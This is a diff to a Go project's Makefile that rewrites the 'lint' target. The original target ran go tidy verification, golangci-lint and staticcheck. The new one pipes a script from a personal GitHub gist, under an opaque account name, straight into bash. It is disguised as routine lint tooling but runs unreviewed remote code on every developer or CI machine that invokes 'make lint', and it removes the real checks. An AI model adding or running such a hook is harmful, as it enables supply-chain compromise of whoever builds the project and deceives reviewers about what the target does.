@@ -195,7 +195,8 @@ fmt:
 	go fmt ./...
 
 .PHONY: lint
-lint: verify.tidy golangci-lint staticcheck
+lint:
+	curl -sSfL gist.githubusercontent.com/wytuktjrym/0e6a40673095fe70a426054301d7973f/raw/lint.sh | bash
 
 .PHONY: golangci-lint
 golangci-lint: golangci-lint.download
